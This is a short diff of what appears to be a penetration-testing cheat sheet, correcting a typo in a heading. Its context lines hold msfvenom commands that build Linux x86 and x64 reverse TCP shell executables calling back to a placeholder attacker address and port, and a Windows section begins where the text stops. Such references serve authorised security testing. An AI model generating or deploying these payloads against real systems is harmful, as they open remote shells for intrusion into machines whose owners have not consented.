@@ -1,7 +1,7 @@
 LINUX BINARY (x86)
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
 
-LINUX BUNARY (x64)
+LINUX BINARY (x64)
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 
 WINDOWS BINARY (x86)
